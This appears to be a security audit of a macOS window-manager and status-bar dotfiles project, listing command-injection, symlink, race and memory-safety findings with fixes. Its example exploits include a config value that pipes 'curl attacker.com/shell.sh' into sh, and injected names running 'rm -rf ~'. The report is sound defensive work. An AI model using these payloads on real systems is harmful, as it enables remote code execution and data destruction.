# omacosy Security Audit

**Date:** 2026-08-17  
**Scope:** Full repository — shell scripts, Swift helpers, C patch, configs, themes  
**Methodology:** Static analysis of all source files for command injection, memory safety, path traversal, race conditions, and privilege escalation vectors

**Total findings:** 47 (1 critical, 8 high, 20 medium, 18 low)

---

## CRITICAL (1)

### 1. `popen()` command injection from config values

**File:** `patches/aerospace-swipe` → `src/main.m`, `fire_vertical()` (patch lines 480–492)  
**Type:** OS Command Injection (CWE-78)

The `swipe_up` and `swipe_down` values are read from a JSON config file, `strdup`'d, and passed directly to `popen()` with no sanitization:

```c
// Patch line 480-488 (src/main.m, fire_vertical)
char* owned = strdup(cmd);
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
    FILE* p = popen(owned, "r");
    if (p)
        pclose(p);
    ...
    free(owned);
});
```

Config loading (patch lines 118–124, `config.h`):

```c
item = yyjson_obj_get(root, "swipe_up");
if (item && yyjson_is_str(item))
    config.swipe_up = strdup(yyjson_get_str(item));
```

**Exploitation:** A malicious or tampered `config.json` (via supply chain, shared dotfiles, or a coworker's PR) with `"swipe_up": "curl attacker.com/shell.sh | sh"` executes arbitrary commands with the user's privileges. The process already holds Accessibility and Input Monitoring permissions, making it a high-value target. No escaping or validation is applied to the string before `popen()`.

**Fix:** Validate config values against `^[a-zA-Z0-9_/.-]+$` before execution, or use `execvp` with an argv array instead of shell parsing.

---

## HIGH (8)

### 2. `sed` injection via `apps.local.conf`

**File:** `install.sh:106–108`  
**Type:** Command Injection (CWE-78)

Variables `$TERMINAL`, `$BROWSER`, `$MUSIC`, `$MESSENGER` sourced from `apps.local.conf` (user-editable, gitignored) are interpolated into `sed` commands without sanitization. If any value contains `|`, `&`, `\n`, or other sed metacharacters, arbitrary content can be injected into the generated `aerospace.toml`.

```bash
source "$REPO_DIR/config/apps.conf"
[ -f "$REPO_DIR/config/apps.local.conf" ] && source "$REPO_DIR/config/apps.local.conf"
sed -e "s|@TERMINAL@|$TERMINAL|g" -e "s|@BROWSER@|$BROWSER|g" \
    -e "s|@MUSIC@|$MUSIC|g" -e "s|@MESSENGER@|$MESSENGER|g" \
  "$REPO_DIR/config/aerospace/aerospace.template.toml" > "$REPO_DIR/config/aerospace/aerospace.toml"
```

**Exploit:** A malicious `apps.local.conf` with `TERMINAL='Ghostty\nexec malicious_command'` injects arbitrary lines into the generated TOML.

**Fix:** Reject values containing shell metacharacters (`;|&$(){}` backticks) before the `sed` substitution.

---

### 3. `source` of arbitrary config files

**File:** `install.sh:104–105`  
**Type:** Arbitrary Code Execution (CWE-94)

```bash
source "$REPO_DIR/config/apps.conf"
[ -f "$REPO_DIR/config/apps.local.conf" ] && source "$REPO_DIR/config/apps.local.conf"
```

`apps.local.conf` is gitignored and user-writable. `source` executes whatever shell code is in those files. If the repo is cloned in a shared or attacker-writable location, or the user is tricked into editing it, arbitrary code runs as the user.

**Fix:** Parse `KEY=VALUE` format manually instead of `source`; validate values match `^[A-Za-z0-9_-]+$`.

---

### 4. Bluetooth address injection in `click_script`

**File:** `config/sketchybar/plugins/bluetooth.sh:139,150`  
**Type:** Command Injection (CWE-78)

Bluetooth device MAC addresses (`$addr`) are interpolated into `click_script` strings passed to sketchybar. Sketchybar executes `click_script` values as shell commands. If a malicious Bluetooth device advertises a crafted address, the address containing shell metacharacters would be executed.

```bash
click_script="$PLUGIN_DIR/bluetooth.sh disconnect $addr"
click_script="$PLUGIN_DIR/bluetooth.sh connect $addr"
```

**Exploit:** A Bluetooth device advertising an address like `AA:BB:CC; rm -rf ~` — though real MAC addresses are hex-only, the script doesn't enforce this.

**Fix:** Validate `$addr` matches `^[0-9A-F:]+$` before interpolation.

---

### 5. Audio device name injection in `click_script`

**File:** `config/sketchybar/plugins/volume_menu.sh:104`  
**Type:** Command Injection (CWE-78)

Audio device names (`$dev`) are interpolated into a `click_script` string using double quotes. Device names containing double quotes or other shell metacharacters break out of the quoting and execute arbitrary code.

```bash
click_script="$PLUGIN_DIR/volume_menu.sh select \"$dev\""
```

**Exploit:** A rogue audio device named `foo"; rm -rf ~; echo "` would execute arbitrary commands when the popup row is clicked.

**Fix:** Escape `$dev` for shell context or use an argv array instead of string interpolation.

---

### 6. Unsanitized workspace name in `bash -c`

**File:** `config/aerospace/aerospace.toml:32`  
**Type:** Command Injection (CWE-78)

`$AEROSPACE_FOCUSED_WORKSPACE` is injected directly into a `bash -c` command string without any sanitization or quoting. AeroSpace sets this env var to the workspace name.

```bash
exec-on-workspace-change = ['/bin/bash', '-c',
  '/opt/homebrew/bin/sketchybar ... FOCUSED_WORKSPACE=$AEROSPACE_FOCUSED_WORKSPACE; touch /tmp/omacosy-ws-switch; $HOME/.local/bin/omacosy-focus-guard'
]
```

Workspace names are currently `1–19` (safe), but this is an unsafe pattern.

**Fix:** Validate `$AEROSPACE_FOCUSED_WORKSPACE` matches `^[0-9]+$` before passing to `bash -c`.

---

### 7. Symlink attack on predictable PID file

**File:** `uninstall.sh:31–32`  
**Type:** Symlink Attack / Signal Injection (CWE-59)

The PID file path `/tmp/omacosy-overview-$(id -u).pid` is predictable and lives in `/tmp`. An attacker can pre-create a symlink at this path pointing to a file containing a known PID, causing `kill` to send SIGTERM to an arbitrary process.

```bash
if [ -f "/tmp/omacosy-overview-$(id -u).pid" ]; then
  kill "$(cat "/tmp/omacosy-overview-$(id -u).pid")" 2>/dev/null || true
fi
```

**Fix:** Use `mktemp` or `$TMPDIR` with `O_NOFOLLOW`.

---

### 8. `unsafeBitCast` of private API structs

**File:** `helper/borders.swift:139–163`  
**Type:** Memory Safety / Stack Corruption (CWE-787)

The `blEnabled()` and `blSet()` functions cast private method implementations to C function pointers via `unsafeBitCast`. The `BLStatus` struct (lines 139–147) is a hand-rolled layout mirroring a private CoreBrightness struct. If Apple changes this layout in a future macOS release, the struct fields will misalign, causing out-of-bounds reads/writes.

```swift
let f = unsafeBitCast(method_getImplementation(m), to: GetFn.self)
var st = BLStatus()
_ = withUnsafeMutablePointer(to: &st) { f(client, sel, UnsafeMutableRawPointer($0)) }
```

**Fix:** Add runtime layout validation or graceful fallback when the struct size doesn't match expectations.

---

### 9. Raw byte construction for SkyLight event records

**Files:** `helper/ffm.swift:42–52`, `helper/overview.swift:39–49`  
**Type:** Memory Safety (CWE-787)

The `slpsFocus` functions manually construct a 0xf8-byte `SLPSPostEventRecordTo` payload by writing to hardcoded offsets in a `[UInt8]` array, then pass its raw buffer pointer.

```swift
var bytes = [UInt8](repeating: 0, count: 0xf8)
bytes[0x04] = 0xf8
bytes[0x3a] = 0x10
withUnsafeBytes(of: &w) { src in
    for i in 0..<4 { bytes[0x3c + i] = src[i] }
}
for i in 0x20..<0x30 { bytes[i] = 0xff }
bytes[0x08] = 0x01
bytes.withUnsafeMutableBufferPointer { _ = SLPSPostEvent(&psn, $0.baseAddress!) }
```

These offsets are reverse-engineered from private SkyLight headers. A macOS update changing the struct layout would cause SkyLight to interpret garbage bytes as window IDs or event metadata, potentially focusing the wrong window or crashing the WindowServer connection.

**Fix:** Add runtime layout validation; consider fallback to less efficient but safer APIs.

---

## MEDIUM (20)

### 10. Unvalidated `$PERCENTAGE` in `osascript`

**File:** `config/sketchybar/plugins/volume_menu.sh:37`

```bash
osascript -e "set volume output volume ${PERCENTAGE:-50}"
```

`$PERCENTAGE` comes from sketchybar's slider callback. Interpolated directly into an `osascript` string. Non-numeric data could inject arbitrary AppleScript.

---

### 11. AppleScript injection via filenames

**File:** `bin/theme-set:58–64`

```bash
WALL="$(ls "$THEMES_DIR/$NAME"/backgrounds/* 2>/dev/null | head -1)"
osascript -e "tell application \"System Events\" to tell every desktop to set picture to \"$WALL\""
```

`$WALL` is interpolated directly into an AppleScript string literal. A background file named `test$(curl attacker.com|.jpg` or `foo"; do shell script "malicious";` would inject arbitrary AppleScript/commands. Only executes when `omacosy-helper` is not built (fallback path).

---

### 12. `source` of attacker-controllable files

**File:** `config/sketchybar/sketchybarrc:10–11`

```bash
source "$OMACOSY_CONFIG/apps.conf"
[ -f "$OMACOSY_CONFIG/apps.local.conf" ] && source "$OMACOSY_CONFIG/apps.local.conf"
```

`apps.local.conf` and theme `sketchybar.sh` are sourced as bash. Compromise of either file = full code execution in the sketchybar context.

---

### 13. Predictable temp files — symlink attacks

**Multiple files** — `install.sh:235,251,267`, `borders.swift:244`, `dwindle.swift:55,67`, `ffm.swift:219,263`, `overview.swift:68,71,95,99`, `watcher.swift:48`, `sketchybarrc:16`, `weather.sh:12`, `wifi.sh:26`, `bluetooth.sh:113`, `popup_guard.sh:39`, `display_change.sh:5`

All use predictable `/tmp` paths without `mktemp` or `O_NOFOLLOW`:

| Path | File |
|------|------|
| `/tmp/omacosy-ffm.err` | `install.sh:235` |
| `/tmp/omacosy-borders.log` | `borders.swift:244` |
| `/tmp/omacosy-overlay-active-<uid>` | `overview.swift:71` |
| `/tmp/omacosy-ws-switch` | `aerospace.toml:32` |
| `${TMPDIR}/sketchybar-weather` | `weather.sh:12` |
| `${TMPDIR}/sketchybar-pubip` | `wifi.sh:26` |
| `${TMPDIR}/omacosy-monitor-count` | `display_change.sh:5` |

Attacker pre-creates a symlink at any of these paths → overwrite system files or read sensitive data.

---

### 14. TOCTOU race in symlink backup

**File:** `install.sh:78–100`

```bash
if [ -L "$dst" ]; then          # CHECK
    cur="$(readlink "$dst")"     # window — symlink could be swapped here
    ...
elif [ -e "$dst" ] ... then     # CHECK
    local bak="$dst.bak.$(date +%Y%m%d%H%M%S)"
    mv "$dst" "$bak"            # USE — file could be different now
fi
```

Between the check and the action, another process could swap the symlink target.

---

### 15. `rm -f` glob on shared `/tmp`

**File:** `uninstall.sh:35–40`

```bash
rm -f /tmp/omacosy-*.log /tmp/omacosy-*.err "/tmp/omacosy-overview-$(id -u).pid" ...
```

Glob expansion in `/tmp` matches attacker-created symlinks → `rm -f` deletes the symlink target.

---

### 16. Unquoted variable in `xargs brew uninstall`

**File:** `uninstall.sh:154–157`

```bash
grep '^brew-formula ' "$MANIFEST" | awk '{print $2}' \
    | xargs -n1 brew uninstall 2>/dev/null || true
```

Manifest entries piped to `xargs` without sanitization. A crafted manifest line with shell metacharacters could execute unintended commands.

---

### 17. `eval` of theme file variables

**File:** `bin/omacosy-bar-repaint:22,30–31`

```bash
source "$HOME/.config/omarchy/current/theme/sketchybar.sh" 2>/dev/null || exit 1
eval "from=\${OLD_$slot:-}"
eval "to=\${$slot:-}"
```

If the theme symlink is compromised, arbitrary code executes before the `source` returns.

---

### 18. `@PLACEHOLDER@` substitution without sanitization

**File:** `config/aerospace/aerospace.template.toml:65–66,133–134`

```
cmd-ctrl-alt-enter = 'exec-and-forget open -na @TERMINAL@'
cmd-ctrl-alt-shift-enter = 'exec-and-forget open -a @BROWSER@'
```

`install.sh` does raw `sed` replacement; values containing `;`, `$`, backticks inject into the AeroSpace config.

---

### 19. Unquoted `$TERMINAL` in `click_script`

**File:** `config/sketchybar/sketchybarrc:226`

```bash
click_script="open -na $TERMINAL --args --title=omacosy-activity -e btop"
```

`$TERMINAL` from `apps.conf` is unquoted. Word splitting on app name.

---

### 20. Aerospace binary PATH fallback

**Files:** `helper/dwindle.swift:39–40`, `helper/overview.swift:126–127`

```swift
let aerospaceBin = ["/opt/homebrew/bin/aerospace", "/usr/local/bin/aerospace"]
    .first { FileManager.default.isExecutableFile(atPath: $0) } ?? "aerospace"
```

Falls back to bare `"aerospace"` relying on `$PATH`. A trojan binary earlier in PATH hijacks execution.

---

### 21. `IOHIDSystem` access without entitlement check

**File:** `helper/main.swift:175–181`

```swift
let svc = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOHIDSystem"))
var conn: io_connect_t = 0
guard IOServiceOpen(svc, mach_task_self_, UInt32(kIOHIDParamConnectType), &conn) == KERN_SUCCESS
```

Any process that can invoke `omacosy-helper capslock off` can manipulate HID state. No entitlement verification.

---

### 22. Force-unwrap on `wids.withUnsafeBufferPointer`

**File:** `helper/borders.swift:573`

```swift
_ = wids.withUnsafeBufferPointer {
    SLSRequestNotificationsForWindows(cid, $0.baseAddress!, Int32(wids.count))
}
```

If `wids` is somehow empty, `baseAddress` returns `nil` and `!` crashes.

---

### 23. Force-cast of `AXValue`

**File:** `helper/ffm.swift:177–178`

```swift
AXValueGetValue(posRef as! AXValue, .cgPoint, &pos)
AXValueGetValue(sizeRef as! AXValue, .cgSize, &size)
```

Malicious app returns wrong type → crash of focus-follows-mouse daemon.

---

### 24. Keystroke characters logged to world-readable `/tmp`

**File:** `helper/overview.swift:447`

```swift
override func keyDown(with event: NSEvent) {
    tlog("keyDown code=\(event.keyCode) chars='\(event.charactersIgnoringModifiers ?? "")' shown=\(shownIds)")
```

Keystroke characters written to `/tmp/omacosy-overview.log`. Password fields or secure text could be captured.

---

### 25. Bluetooth MAC addresses printed to stdout

**File:** `helper/main.swift:273–277`

```swift
for d in (IOBluetoothDevice.pairedDevices() as? [IOBluetoothDevice]) ?? [] {
    let addr = d.addressString ?? "?"
    print("\(d.isConnected() ? 1 : 0)\t\(addr)\t\(name)\t\(kind(d))")
```

Paired device list readable by any process capturing stdout.

---

### 26. All private API bindings have no fallback

**All Swift files** — `@_silgen_name` bindings

Every file binds to undocumented symbols via `@_silgen_name`. If Apple renames, removes, or changes the signature of any symbol, the process crashes with `dyld: Symbol not found` or silently calls the wrong function.

---

### 27. Unquoted `$HOME` in 20+ `exec-and-forget` lines

**File:** `config/aerospace/aerospace.toml:92–132`

```
cmd-ctrl-alt-s = 'exec-and-forget $HOME/.local/bin/omacosy-float'
cmd-ctrl-alt-1 = 'exec-and-forget $HOME/.local/bin/omacosy-ws 1'
```

All 20+ lines use unquoted `$HOME`. Spaces or metacharacters in `$HOME` break execution.

---

## LOW (18)

| # | Location | Issue |
|---|----------|-------|
| 28 | All `tlog()` functions | Log files world-readable in `/tmp` — window titles, app names, workspace names disclosed |
| 29 | `zsh/zshrc:25` | `source <(fzf --zsh)` — PATH hijack if trojan `fzf` exists earlier in `$PATH` |
| 30 | `zsh/zshrc:20` | `source ~/.zshrc.local` without permission check |
| 31 | `bin/theme-set:34`, `bin/omacosy-bar-repaint:30` | Latent `eval` injection — currently hardcoded slot list, fragile pattern |
| 32 | `bin/omacosy-focus-guard:46` | Predictable log file path in `/tmp` |
| 33 | `bin/omacosy-ws-collapse:30,48,66` | Predictable log file paths in `/tmp` |
| 34 | `config/sketchybar/plugins/wifi.sh:26,130` | Predictable public IP cache — world-readable, tamperable |
| 35 | `config/sketchybar/plugins/weather.sh:12,160` | Predictable weather cache — symlink attack on `.tmp` intermediate |
| 36 | `config/sketchybar/plugins/display_change.sh:5` | Predictable monitor count file in `/tmp` |
| 37 | All config files | World-readable permissions (644/755) — typical for single-user Mac, risk on multi-user |
| 38 | `config/aerospace-swipe/config.json:8–9` | Shell expansion in JSON config values — `$HOME` expanded by shell at runtime |
| 39 | `config/sketchybar/plugins/front_app.sh:4` | Unsanitized `$INFO` — app name used as label without escaping |
| 40 | `uninstall.sh:81` | Unquoted variable in `grep -F` — mitigated by `-F` flag |
| 41 | `zsh/zshrc:35` | Hardcoded home path leaks username |
| 42 | `zsh/zshrc:4,23–24` | `eval` of `brew shellenv`/`starship init`/`zoxide init` — mitigated by hardcoded paths |
| 43 | Patch `src/main.m:403–409` | Symlink attack on `/tmp` stamp file — same predictable-path pattern |
| 44 | Patch `src/main.m:431–448` | PID reuse race in overlay detection — stale PID suppresses all workspace switches |
| 45 | Patch `src/main.m:696–710` | NULL deref on `malloc` failure in MT callback — crashes gesture daemon under memory pressure |

---

## Theme Scripts

All four theme directories (`catppuccin`, `gruvbox`, `osaka-jade`, `tokyo-night`) contain only:
- `sketchybar.sh`: static `export` statements with hardcoded hex color values
- `borders.sh`: static `export` statements with hardcoded hex color values
- `colors.toml`: plain TOML key-value pairs with hex color codes
- `backgrounds/`: image files (JPGs)

No variable interpolation, no `eval`, no `source` of external data, no user-controlled inputs. **Clean.**

---

## Recommended Fix Priority

1. **`popen()` in aerospace-swipe patch** — validate config values or use `execvp` with argv array
2. **All `/tmp` paths** — replace with `mktemp`/`mkstemp` or `O_NOFOLLOW` (~15 locations)
3. **`click_script` injection** (bluetooth.sh, volume_menu.sh) — validate/sanitize device names
4. **`aerospace.toml` shell commands** — quote `$HOME`, validate workspace names
5. **`install.sh` template substitution** — reject metacharacters in `apps.local.conf` values
6. **Private API struct layouts** — add runtime validation or graceful fallback
